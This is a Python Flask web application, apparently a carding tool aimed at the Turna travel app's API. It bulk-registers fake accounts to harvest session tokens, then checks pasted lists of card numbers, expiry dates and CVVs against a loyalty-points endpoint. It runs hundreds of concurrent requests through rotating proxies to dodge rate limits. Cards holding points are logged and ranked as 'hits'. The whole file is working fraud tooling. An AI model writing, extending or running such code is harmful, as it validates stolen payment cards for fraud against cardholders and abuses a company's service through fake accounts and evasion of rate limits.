import requests
import json
import os
import time
import threading
import logging
import random
import string
import base64
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
from proxy_manager import get_proxy_config, get_proxy_stats, reset_proxies
import asyncio
import aiohttp

MAX_CONCURRENT_REQUESTS = 400
request_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

__author__ = "skzyzskz"
__version__ = "2.0.0"

session_db_lock = threading.Lock()
app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('app.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.WARNING)

class StatusEndpointFilter(logging.Filter):
    def filter(self, record):
        return '/get_status' not in record.getMessage() and '/status' not in record.getMessage()

werkzeug_logger.addFilter(StatusEndpointFilter())

PROXY_STATUS = {
    'is_set': False,
    'proxy_url': None,
    'last_test': None,
    'test_result': None,
    'rotation_enabled': True,
    'current_proxy': None
}

def load_proxy_config():
    try:
        if os.path.exists(PROXY_CONFIG_FILE):
            with open(PROXY_CONFIG_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    config = json.loads(content)
                    return config
        return None
    except Exception as e:
        logger.error(f"Load proxy config error: {e}")
        return None

def save_proxy_config():
    try:
        config = {
            'is_set': PROXY_STATUS['is_set'],
            'proxy_url': PROXY_STATUS['proxy_url'],
            'rotation_enabled': PROXY_STATUS['rotation_enabled']
        }
        with open(PROXY_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.error(f"Save proxy config error: {e}")
        return False

results_queue = queue.Queue()
processing_status = {"is_processing": False, "total_cards": 0, "processed_cards": 0, "successful_cards": 0}
SESSIONS_DB_FILE = 'sessions_database.json'
PROXY_CONFIG_FILE = 'proxy_config.json'
rate_limited_sessions = set()
rate_limit_lock = threading.Lock()

def _load_db_internal():
    try:
        if os.path.exists(SESSIONS_DB_FILE):
            with open(SESSIONS_DB_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if not content:
                    return {"sessions": [], "next_id": 1}
                return json.loads(content)
        return {"sessions": [], "next_id": 1}
    except Exception as e:
        logger.error(f"Load error: {e}")
        return {"sessions": [], "next_id": 1}

def _save_db_internal(data):
    try:
        with open(SESSIONS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.error(f"Save error: {e}")
        return False

def load_sessions_database():
    with session_db_lock:
        return _load_db_internal()

def save_sessions_database(data):
    with session_db_lock:
        return _save_db_internal(data)

def get_all_sessions():
    db = load_sessions_database()
    return db.get("sessions", [])

def add_session(email, password, session_id, session_token, user_id, cookies=None):
    with session_db_lock:
        db = _load_db_internal()
        
        for existing in db["sessions"]:
            if existing["email"] == email:
                existing["session_id"] = session_id
                existing["session_token"] = session_token
                existing["last_used"] = datetime.now().isoformat()
                existing["is_active"] = True
                if _save_db_internal(db):
                    return True, "Updated"
                return False, "Failed"
        
        new_session = {
            "id": db["next_id"],
            "email": email,
            "password": password,
            "session_id": session_id,
            "session_token": session_token,
            "user_id": user_id,
            "cookies": cookies or {},
            "created_at": datetime.now().isoformat(),
            "last_used": datetime.now().isoformat(),
            "is_active": True
        }
        
        db["sessions"].append(new_session)
        db["next_id"] += 1
        
        if _save_db_internal(db):
            logger.info(f"+ {email} (ID: {new_session['id']})")
            return True, "OK"
        return False, "Failed"

def update_session(session_id, is_active=None):
    db = load_sessions_database()
    
    for session in db["sessions"]:
        if session["id"] == session_id:
            if is_active is not None:
                session["is_active"] = is_active
            session["updated_at"] = datetime.now().isoformat()
            
            if save_sessions_database(db):
                logger.info(f"^ {session['email']} (ID: {session_id})")
                return True, "OK"
            return False, "Failed"
    
    return False, "Not found"

def delete_session(session_id):
    db = load_sessions_database()
    
    for i, session in enumerate(db["sessions"]):
        if session["id"] == session_id:
            deleted = db["sessions"].pop(i)
            if save_sessions_database(db):
                logger.info(f"- {deleted['email']} (ID: {session_id})")
                return True, "OK"
            return False, "Failed"
    
    return False, "Not found"

def get_active_sessions():
    db = load_sessions_database()
    active = [s for s in db["sessions"] if s.get("is_active", True)]
    logger.info(f"{len(active)} sessions active")
    return active

async def create_turna_session_async(session):
    url = "https://apix.turna.com/v1/accounts/auth/B2CSignUp"
    
    email = f"turna_{generate_random_string(10)}@example.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + "Aa1!"
    
    payload = {
        "AuthenticationType": 0,
        "Email": email,
        "Password": password,
        "PasswordConfirm": password,
        "InvitationCode": "",
        "FirstName": "User",
        "LastName": generate_random_string(6),
        "Gender": "M",
        "CountryCode": "TR",
        "LanguageCode": "TR",
        "CurrencyCode": "TRY",
        "AgreementAgreed": True,
        "IsMailingAllowed": False
    }
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "okhttp/4.9.2",
        "Accept-Language": "tr",
    }
    
    proxy_url = None
    if PROXY_STATUS['rotation_enabled']:
        try:
            raw_proxy_config = get_proxy_config('round_robin')
            proxy_url = raw_proxy_config.get('http') if raw_proxy_config else None
        except Exception:
            pass
    else:
        base_proxy_url = PROXY_STATUS['proxy_url']
        proxy_url = get_rotating_proxy_url(base_proxy_url) if base_proxy_url else None
    
    try:
        timeout = aiohttp.ClientTimeout(total=60.0)
        async with session.post(url, json=payload, headers=headers, proxy=proxy_url, timeout=timeout) as response:
            if response.status == 200:
                response_data = await response.json()
                user_id = response_data.get("UserId")
                session_id = response.headers.get('turna-session-id') or response.headers.get('Turna-Session-Id')
                session_token = response.headers.get('turna-session-token') or response.headers.get('Turna-Session-Token')
                
                if session_id and session_token and user_id:
                    return {
                        "email": email,
                        "password": password,
                        "session_id": session_id,
                        "session_token": session_token,
                        "user_id": user_id
                    }
    except:
        pass
    
    return None

def create_turna_session():
    url = "https://apix.turna.com/v1/accounts/auth/B2CSignUp"
    
    email = f"turna_{generate_random_string(10)}@example.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + "Aa1!"
    
    payload = {
        "AuthenticationType": 0,
        "Email": email,
        "Password": password,
        "PasswordConfirm": password,
        "InvitationCode": "",
        "FirstName": "User",
        "LastName": generate_random_string(6),
        "Gender": "M",
        "CountryCode": "TR",
        "LanguageCode": "TR",
        "CurrencyCode": "TRY",
        "AgreementAgreed": True,
        "IsMailingAllowed": False
    }
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "okhttp/4.9.2",
        "Accept-Language": "tr",
    }
    
    proxy_config = None
    if PROXY_STATUS['rotation_enabled']:
        try:
            raw_proxy_config = get_proxy_config('round_robin')
            if raw_proxy_config and raw_proxy_config.get('http'):
                proxy_url = raw_proxy_config['http']
                if '://' in proxy_url and '@' in proxy_url:
                    protocol_part, rest = proxy_url.split('://', 1)
                    auth_part, host_port = rest.split('@', 1)
                    username, password_p = auth_part.split(':', 1)
                    host, port = host_port.split(':', 1)
                    proxy_config = {
                        'http': f'http://{username}:{password_p}@{host}:{port}',
                        'https': f'http://{username}:{password_p}@{host}:{port}'
                    }
        except Exception as e:
            logger.debug(f"Proxy config error: {e}")
    else:
        if PROXY_STATUS['proxy_url']:
            rotated_url = get_rotating_proxy_url(PROXY_STATUS['proxy_url'])
            proxy_config = {'http': rotated_url, 'https': rotated_url}
    
    try:
        response = requests.post(url, json=payload, headers=headers, proxies=proxy_config, timeout=60)
        
        if response.status_code == 200:
            response_data = response.json()
            user_id = response_data.get("UserId")
            session_id = response.headers.get('turna-session-id') or response.headers.get('Turna-Session-Id')
            session_token = response.headers.get('turna-session-token') or response.headers.get('Turna-Session-Token')
            
            if session_id and session_token and user_id:
                return {
                    "email": email,
                    "password": password,
                    "session_id": session_id,
                    "session_token": session_token,
                    "user_id": user_id,
                    "cookies": dict(response.cookies)
                }
    except:
        pass
    
    return None

def set_proxy(proxy_string):
    global PROXY_STATUS
    
    try:
        if not proxy_string or not isinstance(proxy_string, str):
            return False, "Invalid format"
        
        parts = proxy_string.strip().split(':')
        
        if len(parts) != 4:
            return False, "Format: host:port:user:pass"
        
        ip, port, user, password = parts
        
        try:
            port_int = int(port)
            if port_int < 1 or port_int > 65535:
                return False, "Invalid port"
        except ValueError:
            return False, "Invalid port"
        
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        
        PROXY_STATUS['is_set'] = True
        PROXY_STATUS['proxy_url'] = proxy_url
        PROXY_STATUS['last_test'] = None
        PROXY_STATUS['test_result'] = None
        PROXY_STATUS['rotation_enabled'] = False
        
        save_proxy_config()
        logger.info(f"Proxy set: {ip}:{port}")
        return True, f"Proxy saved: {ip}:{port}"
        
    except Exception as e:
        logger.error(f"Proxy error: {e}")
        return False, str(e)

def clear_proxy():
    global PROXY_STATUS
    
    PROXY_STATUS['is_set'] = False
    PROXY_STATUS['proxy_url'] = None
    PROXY_STATUS['last_test'] = None
    PROXY_STATUS['test_result'] = None
    PROXY_STATUS['rotation_enabled'] = True
    PROXY_STATUS['current_proxy'] = None
    
    save_proxy_config()
    logger.info("Proxy cleared")
    return True, "OK"

def test_proxy():
    global PROXY_STATUS
    
    if PROXY_STATUS['rotation_enabled']:
        proxy_config = get_proxy_config('random')
        if not proxy_config['http']:
            return False, "Test edilecek proxy bulunamadı"
        
        try:
            import time
            start_time = time.time()
            test_url = "https://httpbin.org/ip"
            response = requests.get(test_url, proxies=proxy_config, timeout=10)
            end_time = time.time()
            response_time = int((end_time - start_time) * 1000)
            
            if response.status_code == 200:
                result = response.json()
                ip_address = result.get('origin', 'Bilinmiyor')
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': True,
                    'ip': ip_address,
                    'response_time': response_time,
                    'type': 'rotation'
                }
                logger.info(f"Proxy OK: {ip_address} ({response_time}ms)")
                return True, f"Proxy OK - IP: {ip_address} ({response_time}ms)"
            else:
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': False,
                    'error': f"HTTP {response.status_code}",
                    'response_time': response_time,
                    'type': 'rotation'
                }
                return False, f"Rotasyon proxy test başarısız - HTTP {response.status_code}"
                
        except Exception as e:
            PROXY_STATUS['last_test'] = datetime.now().isoformat()
            PROXY_STATUS['test_result'] = {
                'success': False,
                'error': str(e),
                'response_time': None,
                'type': 'rotation'
            }
            return False, f"Rotasyon proxy test hatası: {str(e)}"
    
    elif PROXY_STATUS['proxy_url']:
        try:
            import time
            start_time = time.time()
            proxy_config = {'http': PROXY_STATUS['proxy_url'], 'https': PROXY_STATUS['proxy_url']}
            test_url = "https://httpbin.org/ip"
            response = requests.get(test_url, proxies=proxy_config, timeout=10)
            end_time = time.time()
            response_time = int((end_time - start_time) * 1000)
            
            if response.status_code == 200:
                result = response.json()
                ip_address = result.get('origin', 'Bilinmiyor')
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': True,
                    'ip': ip_address,
                    'response_time': response_time,
                    'type': 'manual'
                }
                logger.info(f"Proxy OK: {ip_address} ({response_time}ms)")
                return True, f"Proxy OK - IP: {ip_address} ({response_time}ms)"
            else:
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': False,
                    'error': f"HTTP {response.status_code}",
                    'response_time': response_time,
                    'type': 'manual'
                }
                return False, f"Manuel proxy test başarısız - HTTP {response.status_code}"
                
        except Exception as e:
            PROXY_STATUS['last_test'] = datetime.now().isoformat()
            PROXY_STATUS['test_result'] = {
                'success': False,
                'error': str(e),
                'response_time': None,
                'type': 'manual'
            }
            return False, f"Manuel proxy test hatası: {str(e)}"
    
    return False, "Test edilecek proxy bulunamadı"

def get_proxy_status():
    return {
        'is_set': PROXY_STATUS['is_set'],
        'proxy_url': PROXY_STATUS['proxy_url'],
        'last_test': PROXY_STATUS['last_test'],
        'test_result': PROXY_STATUS['test_result'],
        'rotation_enabled': PROXY_STATUS['rotation_enabled'],
        'current_proxy': PROXY_STATUS['current_proxy']
    }

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

_session_rotation_enabled = False

def get_rotating_proxy_url(base_proxy_url):
    """Generate proxy URL with random session ID"""
    global _session_rotation_enabled
    
    if not base_proxy_url or 'lunaproxy' not in base_proxy_url.lower():
        return base_proxy_url
    
    try:
        if '://' in base_proxy_url and '@' in base_proxy_url:
            protocol, rest = base_proxy_url.split('://', 1)
            auth, host_port = rest.split('@', 1)
            username, password = auth.split(':', 1)
            
            if 'sessid-' in username:
                random_session = generate_random_string(16)
                
                import re
                username = re.sub(r'sessid-[^-]+', f'sessid-us{random_session}', username)
                
                if not _session_rotation_enabled:
                    _session_rotation_enabled = True
                    logger.info("🔄 Session rotation enabled - using dynamic IPs")
                
                return f"{protocol}://{username}:{password}@{host_port}"
        
        return base_proxy_url
    except Exception as e:
        logger.debug(f"Proxy rotation error: {e}")
        return base_proxy_url

def get_turna_headers(turna_session):
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept': 'application/json',
        'Accept-Language': 'tr',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.2',
        'turna-user-agent': '10.55 - android',
        'turna-session-id': str(turna_session['session_id']),
        'turna-session-token': turna_session['session_token'],
    }
    return headers

_session = None
_session_lock = threading.Lock()

def get_session():
    global _session
    if _session is None:
        with _session_lock:
            if _session is None:
                _session = requests.Session()
                adapter = requests.adapters.HTTPAdapter(
                    pool_connections=400,
                    pool_maxsize=400,
                    max_retries=0
                )
                _session.mount('http://', adapter)
                _session.mount('https://', adapter)
    return _session

def check_card_points(card_info, turna_session):
    url = "https://apix.turna.com/v1/accounts/user/creditCardPoints?lang=tr"
    headers = get_turna_headers(turna_session)
    
    card_type = "mastercard" if card_info['card_number'].startswith('5') else "visa"
    
    payload = {
        "appVersion": "10.55",
        "cardHolder": "USER TEST",
        "cardType": card_type,
        "cardNumber": card_info['card_number'],
        "expirationMonth": card_info['month'],
        "expirationYear": card_info['year'],
        "ccv": card_info['cvv'],
        "membershipType": 0
    }
    
    if PROXY_STATUS['rotation_enabled']:
        try:
            raw_proxy_config = get_proxy_config('round_robin')
            proxy_config = raw_proxy_config if raw_proxy_config and raw_proxy_config.get('http') else {'http': None, 'https': None}
        except Exception:
            proxy_config = {'http': None, 'https': None}
    else:
        proxy_config = {'http': PROXY_STATUS['proxy_url'], 'https': PROXY_STATUS['proxy_url']} if PROXY_STATUS['proxy_url'] else {'http': None, 'https': None}
    
    cookies = turna_session.get('cookies', {})
    sess = get_session()
    try:
        response = sess.post(
            url, 
            headers=headers, 
            json=payload, 
            cookies=cookies,
            proxies=proxy_config,
            timeout=5.0
        )
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                points = response_data.get('Point', 0.0)
                return {
                    'success': True,
                    'card_info': card_info,
                    'points': points,
                    'response': json.dumps(response_data, ensure_ascii=False),
                    'status_code': 200
                }
            except Exception:
                return {
                    'success': False,
                    'card_info': card_info,
                    'error': "Parse error",
                    'points': 0,
                    'status_code': 200
                }
        else:
            return {
                'success': False,
                'card_info': card_info,
                'error': f"Status {response.status_code}",
                'points': 0,
                'status_code': response.status_code
            }
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'card_info': card_info,
            'error': "Timeout",
            'points': 0,
            'status_code': 0
        }
    except requests.exceptions.ConnectionError:
        return {
            'success': False,
            'card_info': card_info,
            'error': "Connection error",
            'points': 0,
            'status_code': 0
        }
    except Exception as e:
        return {
            'success': False,
            'card_info': card_info,
            'error': f"Error: {str(e)[:50]}",
            'points': 0,
            'status_code': 0
        }

async def check_card_points_async(session, card_info, turna_session):
    url = "https://apix.turna.com/v1/accounts/user/creditCardPoints?lang=tr"
    headers = get_turna_headers(turna_session)
    
    card_type = "mastercard" if card_info['card_number'].startswith('5') else "visa"
    
    payload = {
        "appVersion": "10.55",
        "cardHolder": "USER TEST",
        "cardType": card_type,
        "cardNumber": card_info['card_number'],
        "expirationMonth": card_info['month'],
        "expirationYear": card_info['year'],
        "ccv": card_info['cvv'],
        "membershipType": 0
    }
    
    if PROXY_STATUS['rotation_enabled']:
        try:
            raw_proxy_config = get_proxy_config('round_robin')
            proxy_url = raw_proxy_config.get('http') if raw_proxy_config else None
        except Exception:
            proxy_url = None
    else:
        base_proxy_url = PROXY_STATUS['proxy_url']
        proxy_url = get_rotating_proxy_url(base_proxy_url) if base_proxy_url else None
    
    cookies = turna_session.get('cookies', {})
    
    async with request_semaphore:
        try:
            timeout = aiohttp.ClientTimeout(total=60.0)
            async with session.post(url, headers=headers, json=payload, proxy=proxy_url, timeout=timeout, cookies=cookies) as response:
                if response.status == 200:
                    try:
                        response_data = await response.json()
                        points = response_data.get('Point', 0.0)
                        return {
                            'success': True,
                            'card_info': card_info,
                            'points': points,
                            'response': json.dumps(response_data, ensure_ascii=False),
                            'status_code': 200
                        }
                    except Exception:
                        return {
                            'success': False,
                            'card_info': card_info,
                            'error': "Parse error",
                            'points': 0,
                            'status_code': 200
                        }
                else:
                    return {
                        'success': False,
                        'card_info': card_info,
                        'error': f"Status {response.status}",
                        'points': 0,
                        'status_code': response.status
                    }
        except asyncio.TimeoutError:
            return {
                'success': False,
                'card_info': card_info,
                'error': "Timeout",
                'points': 0,
                'status_code': 0
            }
        except aiohttp.ClientError:
            return {
                'success': False,
                'card_info': card_info,
                'error': "Connection error",
                'points': 0,
                'status_code': 0
            }
        except Exception as e:
            return {
                'success': False,
                'card_info': card_info,
                'error': f"Error: {str(e)[:50]}",
                'points': 0,
                'status_code': 0
            }

_session_index = 0
_session_index_lock = threading.Lock()

def get_next_session(sessions):
    global _session_index
    if not sessions:
        return None
    
    with _session_index_lock:
        sess = sessions[_session_index]
        _session_index = (_session_index + 1) % len(sessions)
        sess['last_used'] = datetime.now().isoformat()
        return sess

card_log_lock = threading.Lock()

def log_card_result(card_info, result):
    """Log card result to file"""
    try:
        with card_log_lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            card_str = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
            
            if result['success']:
                points = result.get('points', 0)
                status = f"✅ {points} TL" if points > 0 else "⚪ 0 TL"
                log_line = f"[{timestamp}] {status} | {card_str}\n"
            else:
                error = result.get('error', 'Unknown')
                log_line = f"[{timestamp}] ❌ ERROR ({error}) | {card_str}\n"
            
            with open('turna_results.txt', 'a', encoding='utf-8') as f:
                f.write(log_line)
    except Exception as e:
        logger.debug(f"Log write error: {e}")

async def process_single_card_async(session, card_info, sessions):
    turna_session = get_next_session(sessions)
    if not turna_session:
        processing_status["processed_cards"] += 1
        return
    
    result = await check_card_points_async(session, card_info, turna_session)
    
    log_card_result(card_info, result)
    
    if result.get('status_code') == 401:
        with rate_limit_lock:
            sess_id = turna_session.get('id')
            if sess_id and sess_id not in rate_limited_sessions:
                rate_limited_sessions.add(sess_id)
    elif result['success']:
        if result['points'] > 0:
            results_queue.put({
                'card_number': card_info['card_number'],
                'month': card_info['month'],
                'year': card_info['year'],
                'cvv': card_info['cvv'],
                'points': result['points'],
                'response': result.get('response', '')
            })
            processing_status["successful_cards"] += 1
            logger.info(f"🎯 HIT: {card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}|{result['points']}")
    
    processing_status["processed_cards"] += 1

async def process_cards_async(cards, sessions=None):
    global rate_limited_sessions, _session_index
    rate_limited_sessions.clear()
    _session_index = 0
    
    processing_status["is_processing"] = True
    processing_status["total_cards"] = len(cards)
    processing_status["processed_cards"] = 0
    processing_status["successful_cards"] = 0
    
    if sessions is None:
        sessions = get_active_sessions()
    
    if not sessions:
        logger.error("No sessions!")
        processing_status["is_processing"] = False
        return
    
    start_time = time.time()
    last_log_time = start_time
    
    try:
        with card_log_lock:
            session_header = f"\n{'='*80}\n[SESSION START] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {len(cards)} cards | {len(sessions)} sessions\n{'='*80}\n"
            with open('turna_results.txt', 'a', encoding='utf-8') as f:
                f.write(session_header)
    except Exception as e:
        logger.debug(f"Log header write error: {e}")
    
    logger.info(f"🚀 Processing {len(cards)} cards with {len(sessions)} sessions (ASYNCIO)...")
    
    connector = aiohttp.TCPConnector(limit=400, limit_per_host=400)
    timeout = aiohttp.ClientTimeout(total=60.0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [process_single_card_async(session, card, sessions) for card in cards]
        
        async def log_progress():
            nonlocal last_log_time
            while processing_status["is_processing"]:
                await asyncio.sleep(1.0)
                current_time = time.time()
                elapsed = current_time - start_time
                processed = processing_status["processed_cards"]
                total = processing_status["total_cards"]
                if processed > 0:
                    rate = processed / elapsed if elapsed > 0 else 0
                    remaining = (total - processed) / rate if rate > 0 else 0
                    logger.info(f"⏳ Progress: {processed}/{total} ({processed*100//total if total > 0 else 0}%) | Speed: {rate:.1f} cards/s | ETA: {remaining:.0f}s | Hits: {processing_status['successful_cards']}")
        
        logger_task = asyncio.create_task(log_progress())
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            processing_status["is_processing"] = False
            await logger_task
    
    total_time = time.time() - start_time
    total_cards = processing_status["total_cards"]
    processed_cards = processing_status["processed_cards"]
    successful_cards = processing_status["successful_cards"]
    avg_speed = processed_cards / total_time if total_time > 0 else 0
    
    try:
        with card_log_lock:
            session_footer = f"{'='*80}\n[SESSION END] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            session_footer += f"Total: {processed_cards}/{total_cards} cards | Time: {total_time:.1f}s | Speed: {avg_speed:.1f} cards/s\n"
            session_footer += f"Cards with points: {successful_cards}\n"
            session_footer += f"{'='*80}\n"
            with open('turna_results.txt', 'a', encoding='utf-8') as f:
                f.write(session_footer)
    except Exception as e:
        logger.debug(f"Log footer write error: {e}")
    
    logger.info(f"✅ Done! Processed {processed_cards}/{total_cards} cards in {total_time:.1f}s | Speed: {avg_speed:.1f} cards/s")
    
    if rate_limited_sessions:
        db = load_sessions_database()
        deleted_count = 0
        for sess_id in rate_limited_sessions:
            for sess in db["sessions"][:]:
                if sess["id"] == sess_id:
                    db["sessions"].remove(sess)
                    deleted_count += 1
                    logger.info(f"🗑️  Deleted invalid session: {sess.get('email', 'Unknown')} (ID: {sess['id']})")
                    break
        if deleted_count > 0:
            save_sessions_database(db)
            logger.info(f"🗑️  Deleted {deleted_count} invalid session(s)")
    
    if successful_cards > 0:
        logger.info(f"🎉 Total {successful_cards} cards with points found!")
        
        temp_results = []
        while not results_queue.empty():
            temp_results.append(results_queue.get())
        
        temp_results.sort(key=lambda x: x.get('points', 0), reverse=True)
        
        for result in temp_results:
            results_queue.put(result)
        
        if temp_results:
            logger.info("🏆 Top cards:")
            for i, card in enumerate(temp_results[:5], 1):
                logger.info(f"  {i}. {card['card_number']} - {card['points']} points")
    else:
        logger.info("❌ No cards with points found.")

def process_cards_parallel(cards, sessions=None):
    asyncio.run(process_cards_async(cards, sessions))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/process_cards', methods=['POST'])
def process_cards():
    try:
        data = request.get_json()
        cards_text = data.get('cards', '')
        
        if not cards_text.strip():
            return jsonify({'error': 'Kart bilgileri boş olamaz'}), 400
        
        sessions = get_active_sessions()
        if not sessions:
            return jsonify({'error': 'No sessions. Lütfen önce session oluşturun.'}), 400
        
        cards = []
        lines = cards_text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            parts = line.split('|')
            if len(parts) != 4:
                continue
                
            card_number, month, year, cvv = parts
            
            cards.append({
                'card_number': card_number.strip(),
                'month': month.strip(),
                'year': year.strip(),
                'cvv': cvv.strip()
            })
        
        if not cards:
            return jsonify({'error': 'Geçerli kart bilgisi bulunamadı'}), 400
        
        thread = threading.Thread(target=process_cards_parallel, args=(cards, sessions))
        thread.daemon = True
        thread.start()
        
        return jsonify({'message': f'{len(cards)} cards {len(sessions)} sessions işleme başlatıldı'})
        
    except Exception as e:
        logger.error(f"Process endpoint hatası: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/status')
def get_status():
    return jsonify(processing_status)

@app.route('/get_status')
def get_status_alt():
    return jsonify(processing_status)

@app.route('/get_results')
def get_results():
    results = []
    while not results_queue.empty():
        results.append(results_queue.get())
    
    results.sort(key=lambda x: x.get('points', 0), reverse=True)
    
    return jsonify({'results': results})

@app.route('/api/sessions', methods=['GET'])
def get_sessions_api():
    try:
        sessions = get_all_sessions()
        return jsonify({'success': True, 'sessions': sessions})
    except Exception as e:
        logger.error(f"Session listeleme hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/<int:session_id>', methods=['DELETE'])
def delete_session_api(session_id):
    try:
        success, message = delete_session(session_id)
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"Session silme hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/active', methods=['GET'])
def get_active_sessions_api():
    try:
        sessions = get_active_sessions()
        return jsonify({'success': True, 'sessions': sessions, 'count': len(sessions)})
    except Exception as e:
        logger.error(f"Aktif session alma hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

session_collection_stats = {'collected': 0, 'failed': 0}
session_collection_lock = threading.Lock()

async def collect_single_session_async(session, index):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            turna_sess = await create_turna_session_async(session)
            if turna_sess:
                success, message = add_session(
                    turna_sess['email'],
                    turna_sess['password'],
                    turna_sess['session_id'],
                    turna_sess['session_token'],
                    turna_sess['user_id'],
                    turna_sess.get('cookies', {})
                )
                if success:
                    with session_collection_lock:
                        session_collection_stats['collected'] += 1
                    return True
                else:
                    with session_collection_lock:
                        session_collection_stats['failed'] += 1
                    return False
            else:
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.2)
        except Exception:
            if attempt < max_retries - 1:
                await asyncio.sleep(0.2)
    
    with session_collection_lock:
        session_collection_stats['failed'] += 1
    return False

async def create_sessions_async(count):
    session_collection_stats['collected'] = 0
    session_collection_stats['failed'] = 0
    
    logger.info(f"🚀 Creating {count} sessions (ASYNCIO)...")
    start_time = time.time()
    last_log_time = start_time
    
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=100)
    timeout = aiohttp.ClientTimeout(total=60.0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        async def log_progress():
            nonlocal last_log_time
            while True:
                await asyncio.sleep(2.0)
                current_time = time.time()
                elapsed = current_time - start_time
                collected = session_collection_stats['collected']
                failed = session_collection_stats['failed']
                total_processed = collected + failed
                
                if total_processed >= count:
                    break
                
                rate = collected / elapsed if elapsed > 0 else 0
                logger.info(f"⏳ {collected}/{count} sessions | {rate:.1f} sessions/s")
                last_log_time = current_time
        
        logger_task = asyncio.create_task(log_progress())
        
        tasks = [collect_single_session_async(session, i) for i in range(count)]
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            logger_task.cancel()
            try:
                await logger_task
            except asyncio.CancelledError:
                pass
    
    elapsed = time.time() - start_time
    collected = session_collection_stats['collected']
    failed = session_collection_stats['failed']
    rate = collected / elapsed if elapsed > 0 else 0
    
    logger.info(f"✅ Done! {collected} OK, {failed} failed | {elapsed:.1f}s | {rate:.1f} sessions/s")
    
    return collected, failed, elapsed

@app.route('/api/sessions/create', methods=['POST'])
def create_sessions_api():
    try:
        data = request.get_json()
        count = int(data.get('count', 1))
        
        if count < 1 or count > 500:
            return jsonify({'success': False, 'error': '1-500'}), 400
        
        collected, failed, elapsed = asyncio.run(create_sessions_async(count))
        
        return jsonify({
            'success': True,
            'message': f'{collected} OK, {failed} fail in {elapsed:.1f}s',
            'collected': collected,
            'failed': failed,
            'time': round(elapsed, 1)
        })
        
    except Exception as e:
        logger.error(f"Create sessions error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/clear', methods=['POST'])
def clear_sessions_api():
    try:
        db = {"sessions": [], "next_id": 1}
        if save_sessions_database(db):
            logger.info("Sessions cleared")
            return jsonify({'success': True, 'message': 'Sessions cleared'})
        else:
            return jsonify({'success': False, 'error': 'Failed'}), 500
    except Exception as e:
        logger.error(f"Session clear error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy', methods=['GET'])
def get_proxy_api():
    try:
        status = get_proxy_status()
        return jsonify({'success': True, **status})
    except Exception as e:
        logger.error(f"Proxy durumu alma hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/rotation', methods=['POST'])
def proxy_rotation_api():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'Geçersiz JSON verisi'}), 400
        
        action = data.get('action')
        
        if action == 'enable':
            PROXY_STATUS['rotation_enabled'] = True
            PROXY_STATUS['is_set'] = False
            PROXY_STATUS['proxy_url'] = None
            save_proxy_config()
            logger.info("Proxy rotasyonu aktif edildi")
            return jsonify({'success': True, 'message': 'Proxy rotasyonu aktif edildi'})
        elif action == 'disable':
            PROXY_STATUS['rotation_enabled'] = False
            save_proxy_config()
            logger.info("Proxy rotasyonu devre dışı bırakıldı")
            return jsonify({'success': True, 'message': 'Proxy rotasyonu devre dışı bırakıldı'})
        else:
            return jsonify({'success': False, 'error': 'Geçersiz aksiyon'}), 400
            
    except Exception as e:
        logger.error(f"Proxy rotasyon hatası: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

